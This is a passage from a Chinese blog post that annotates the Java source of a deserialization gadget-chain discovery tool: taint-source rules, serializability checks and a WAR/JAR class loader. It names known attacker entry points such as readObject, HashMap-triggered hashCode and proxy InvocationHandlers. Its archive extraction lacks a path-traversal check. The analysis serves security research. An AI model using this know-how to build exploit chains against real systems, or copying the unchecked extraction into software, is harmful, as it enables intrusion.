cached;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Boolean result = applyNoCache(handle);</span><br><span class="line"></span><br><span class="line">        cache.put(handle, result);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否可以序列化</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> handle 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Boolean <span class="title">applyNoCache</span><span class="params">(ClassReference.Handle handle)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断类是否在黑名单内</span></span><br><span class="line">        <span class="keyword">if</span> (isBlacklistedClass(handle)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 判断是否有直接或间接实现 java/io/Serializable 序列化接口</span></span><br><span class="line">        <span class="keyword">if</span> (inheritanceMap.isSubclassOf(handle, <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/io/Serializable&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断类是否在黑名单内</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> clazz 类</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isBlacklistedClass</span><span class="params">(ClassReference.Handle clazz)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;com/google/common/collect/&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Serialization of these classes has been disabled since clojure 1.9.0</span></span><br><span class="line">        <span class="comment">// https://github.com/clojure/clojure/commit/271674c9b484d798484d134a5ac40a6df15d3ac3</span></span><br><span class="line">        <span class="keyword">if</span> (clazz.getName().equals(<span class="string">&quot;clojure/core/proxy$clojure/lang/APersistentMap$ff19274a&quot;</span>)</span><br><span class="line">                || clazz.getName().equals(<span class="string">&quot;clojure/inspector/proxy$javax/swing/table/AbstractTableModel$ff19274a&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SimpleImplementationFinder"><a href="#2-SimpleImplementationFinder" class="headerlink" title="2. SimpleImplementationFinder"></a>2. SimpleImplementationFinder</h3><p>实现 <code>ImplementationFinder</code> 接口，返回目标方法的可序列化重写方法（包括目标方法本身）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleImplementationFinder</span> <span class="keyword">implements</span> <span class="title">ImplementationFinder</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SerializableDecider serializableDecider;  <span class="comment">// 序列化决策者</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap;   <span class="comment">// 重写方法</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SimpleImplementationFinder</span><span class="params">(SerializableDecider serializableDecider, Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; methodImplMap)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.serializableDecider = serializableDecider;</span><br><span class="line">        <span class="keyword">this</span>.methodImplMap = methodImplMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;MethodReference.Handle&gt; getImplementations(MethodReference.Handle target) &#123;</span><br><span class="line">        <span class="comment">// 存储可序列化的重写方法</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; allImpls = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Assume that the target method is always available, even if not serializable; the target may just be a local</span></span><br><span class="line">        <span class="comment">// instance rather than something an attacker can control.</span></span><br><span class="line">        allImpls.add(target);   <span class="comment">// 默认认为目标方法可序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历重写方法</span></span><br><span class="line">        Set&lt;MethodReference.Handle&gt; subClassImpls = methodImplMap.get(target);</span><br><span class="line">        <span class="keyword">if</span> (subClassImpls != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (MethodReference.Handle subClassImpl : subClassImpls) &#123;</span><br><span class="line">                <span class="comment">// 判断是否可序列化</span></span><br><span class="line">                <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(subClassImpl.getClassReference()))) &#123;</span><br><span class="line">                    allImpls.add(subClassImpl); <span class="comment">// 添加到 allImpls</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> allImpls;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-SimpleSourceDiscovery"><a href="#3-SimpleSourceDiscovery" class="headerlink" title="3. SimpleSourceDiscovery"></a>3. SimpleSourceDiscovery</h3><p>继承 <code>SourceDiscovery</code> 抽象类，实现具体的污点源查找方法 <code>discover</code>。遍历类信息和方法信息，根据定义的 5 条规则搜索污点源：</p><ul><li>方法所属类可以序列化，且方法为无参数 void 类型的 finalize 方法</li><li>方法所属类可以序列化，且方法为接受 ObjectInputStream 类型参数的 void 类型的 readObject 方法</li><li>类可以序列化，且为 InvocationHandler 的子类</li><li>方法所属类可以序列化，且方法为无参数 int 类型的 hashCode 方法或接受 Object 类型参数的 boolean 类型的 equals 方法</li><li>方法所属类可以序列化，且该类为 groovy Closure 的子类、方法为 call 或 doCall</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SimpleSourceDiscovery</span> <span class="keyword">extends</span> <span class="title">SourceDiscovery</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(Map&lt;ClassReference.Handle, ClassReference&gt; classMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         Map&lt;MethodReference.Handle, MethodReference&gt; methodMap,</span></span></span><br><span class="line"><span class="function"><span class="params">                         InheritanceMap inheritanceMap)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化决策者，用于判断类是否可序列化</span></span><br><span class="line">        <span class="keyword">final</span> SerializableDecider serializableDecider = <span class="keyword">new</span> SimpleSerializableDecider(inheritanceMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 判断所属类是否可序列化</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果是 finalize 方法则认为是受污染的</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;finalize&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// If a class implements readObject, the ObjectInputStream passed in is considered tainted</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果所属类实现了 readObject，则传入的 ObjectInputStream 参数被认为是受污染的</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;readObject&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/io/ObjectInputStream;)V&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历类</span></span><br><span class="line">        <span class="comment">// Using the proxy trick, anything extending serializable and invocation handler is tainted.</span></span><br><span class="line">        <span class="keyword">for</span> (ClassReference.Handle clazz : classMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 判断类是否可序列化，且是否为 InvocationHandler 的子类</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(clazz))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(clazz, <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;java/lang/reflect/InvocationHandler&quot;</span>))) &#123;</span><br><span class="line">                <span class="comment">// 使用代理时，任何扩展 InvocationHandler 的类都被认为受污染</span></span><br><span class="line">                MethodReference.Handle method = <span class="keyword">new</span> MethodReference.Handle(</span><br><span class="line">                        clazz, <span class="string">&quot;invoke&quot;</span>, <span class="string">&quot;(Ljava/lang/Object;Ljava/lang/reflect/Method;[Ljava/lang/Object;)Ljava/lang/Object;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// hashCode() or equals() are accessible entry points using standard tricks of putting those objects</span></span><br><span class="line">        <span class="comment">// into a HashMap.</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))) &#123;</span><br><span class="line">                <span class="comment">// 如果是 hashCode 方法则认为是受污染的（注意描述符）</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;hashCode&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;()I&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 如果是 equals 方法则认为是受污染的（注意描述符）</span></span><br><span class="line">                <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;equals&quot;</span>) &amp;&amp; method.getDesc().equals(<span class="string">&quot;(Ljava/lang/Object;)Z&quot;</span>)) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历方法，和上面的类似（可以合并）</span></span><br><span class="line">        <span class="comment">// Using a comparator proxy, we can jump into the call() / doCall() method of any groovy Closure and all the</span></span><br><span class="line">        <span class="comment">// args are tainted.</span></span><br><span class="line">        <span class="comment">// https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Groovy1.java</span></span><br><span class="line">        <span class="keyword">for</span> (MethodReference.Handle method : methodMap.keySet()) &#123;</span><br><span class="line">            <span class="comment">// 使用比较器代理，可以跳转到任何 groovy Closure 的 call()/doCall() 方法，所有的参数都被污染</span></span><br><span class="line">            <span class="keyword">if</span> (Boolean.TRUE.equals(serializableDecider.apply(method.getClassReference()))</span><br><span class="line">                    &amp;&amp; inheritanceMap.isSubclassOf(method.getClassReference(), <span class="keyword">new</span> ClassReference.Handle(<span class="string">&quot;groovy/lang/Closure&quot;</span>))</span><br><span class="line">                    &amp;&amp; (method.getName().equals(<span class="string">&quot;call&quot;</span>) || method.getName().equals(<span class="string">&quot;doCall&quot;</span>))) &#123;</span><br><span class="line"></span><br><span class="line">                addDiscoveredSource(<span class="keyword">new</span> Source(method, <span class="number">0</span>));</span><br><span class="line">                Type[] methodArgs = Type.getArgumentTypes(method.getDesc());</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methodArgs.length; i++) &#123;</span><br><span class="line">                    addDiscoveredSource(<span class="keyword">new</span> Source(method, i + <span class="number">1</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        SourceDiscovery sourceDiscovery = <span class="keyword">new</span> SimpleSourceDiscovery();</span><br><span class="line">        sourceDiscovery.discover();</span><br><span class="line">        sourceDiscovery.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-工作流程"><a href="#0x03-工作流程" class="headerlink" title="0x03 工作流程"></a>0x03 工作流程</h1><ol><li>准备工作<ul><li>配置 log4j 向控制台输出日志</li><li>配置 config 为默认值 jserial（Java 反序列化）</li><li>接受参数：<code>--resume</code> 保留 .dat 文件、<code>--config</code> 指定分析类型</li><li>根据参数读取 war/jar 包路径，返回 URLClassLoader</li><li>初始化类枚举加载器 ClassResourceEnumerator</li></ul></li><li>MethodDiscovery：类信息、方法信息、继承信息<ul><li>classes.dat：类名、父类名、类接口名、是否为接口、类的所有字段（成员）</li><li>methods.dat：类名、方法名、描述符、是否为静态方法</li><li>inheritanceMap.dat：类名、父类/超类/接口类（直接/间接父类）</li></ul></li><li>PassthroughDiscovery：数据流信息，即方法参数是否能够影响其返回值<ul><li>如果存在方法将参数传递给被调方法时，需要先判断被调方法返回值与被调方法参数的关系。</li><li>passthrough.dat：类名、方法名、方法描述符、污点参数索引</li></ul></li><li>CallGraphDiscovery：方法调用关系信息<ul><li>callgraph.dat：方法所属类名，方法名，方法描述符，被调方法所属类名，被调方法名，被调方法描述，方法参数索引，方法参数对象的字段名称，被调方法参数索引</li></ul></li><li>SourceDiscovery：查找污点源<ul><li>sources.dat：类名，方法名，描述符，参数索引</li></ul></li><li>GadgetChainDiscovery：重写信息、利用链信息<ul><li>methodimpl.dat：类名，方法名，描述符</li><li>gadget-chains.txt：类名.方法名描述符 (参数索引)</li></ul></li></ol><h2 id="1-Util"><a href="#1-Util" class="headerlink" title="1. Util"></a>1. Util</h2><p>根据 java 包路径列表返回 URLClassLoader，后续用于读取相应的 java 包（war、jar）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Util</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger LOGGER = LoggerFactory.getLogger(Util.class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据 war 包路径列表，构造并返回 URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> warPath 包路径列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getWarClassLoader</span><span class="params">(Path warPath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 创建临时文件夹</span></span><br><span class="line">        <span class="keyword">final</span> Path tmpDir = Files.createTempDirectory(<span class="string">&quot;exploded-war&quot;</span>);</span><br><span class="line">        <span class="comment">// Delete the temp directory at shutdown</span></span><br><span class="line">        Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                deleteDirectory(tmpDir);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error cleaning up temp directory &quot;</span> + tmpDir.toString(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 复制到临时文件夹</span></span><br><span class="line">        <span class="comment">// Extract to war to the temp directory</span></span><br><span class="line">        <span class="keyword">try</span> (JarInputStream jarInputStream = <span class="keyword">new</span> JarInputStream(Files.newInputStream(warPath))) &#123;</span><br><span class="line">            JarEntry jarEntry;</span><br><span class="line">            <span class="keyword">while</span> ((jarEntry = jarInputStream.getNextJarEntry()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Path fullPath = tmpDir.resolve(jarEntry.getName());</span><br><span class="line">                <span class="keyword">if</span> (!jarEntry.isDirectory()) &#123;</span><br><span class="line">                    Path dirName = fullPath.getParent();</span><br><span class="line">                    <span class="keyword">if</span> (dirName == <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">&quot;Parent of item is outside temp directory.&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (!Files.exists(dirName)) &#123;</span><br><span class="line">                        Files.createDirectories(dirName);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">try</span> (OutputStream outputStream = Files.newOutputStream(fullPath)) &#123;</span><br><span class="line">                        copy(jarInputStream, outputStream);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 存储包路径</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        classPathUrls.add(tmpDir.resolve(<span class="string">&quot;WEB-INF/classes&quot;</span>).toUri().toURL());</span><br><span class="line">        Files.list(tmpDir.resolve(<span class="string">&quot;WEB-INF/lib&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                classPathUrls.add(p.toUri().toURL());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(classPathUrls.toArray(<span class="keyword">new</span> URL[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 根据 jar 包路径列表，构造并返回 URLClassLoader</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> jarPaths 包路径列表</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ClassLoader <span class="title">getJarClassLoader</span><span class="params">(Path... jarPaths)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 存储包路径</span></span><br><span class="line">        <span class="keyword">final</span> List&lt;URL&gt; classPathUrls = <span class="keyword">new</span> ArrayList&lt;&gt;(jarPaths.length);</span><br><span class="line">        <span class="comment">// 遍历包路径列表</span></span><br><span class="line">        <span class="keyword">for</span> (Path jarPath : jarPaths) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!Files.exists(jarPath) || Files.isDirectory(jarPath)) &#123; <span class="comment">// 查找文件</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Path \&quot;&quot;</span> + jarPath + <span class="string">&quot;\&quot; is not a path to a file.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            classPathUrls.add(jarPath.toUri().toURL()); <span class="comment">//</span></span><br><span class="line">        &#125;</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(classPathUrls.toArray(<span class="keyword">new</span> URL[classPathUrls.size()]));</span><br><span class="line">        <span class="keyword">return</span> classLoader;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Recursively delete the directory root and all its contents</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> root Root directory to be deleted</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteDirectory</span><span class="params">(Path root)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Files.walkFileTree(root, <span class="keyword">new</span> SimpleFileVisitor&lt;Path&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">visitFile</span><span class="params">(Path file, BasicFileAttributes attrs)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                Files.delete(file);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> FileVisitResult <span class="title">postVisitDirectory</span><span class="params">(Path dir, IOException exc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                Files.delete(dir);</span><br><span class="line">                <span class="keyword">return</span> FileVisitResult.CONTINUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Copy inputStream to outputStream. Neither stream is closed by this method.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> inputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> outputStream</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(InputStream inputStream, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">byte</span>[] buffer = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        <span class="keyword">int</span> n;</span><br><span class="line">        <span class="keyword">while</span> ((n = inputStream.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(buffer, <span class="number">0</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line"> 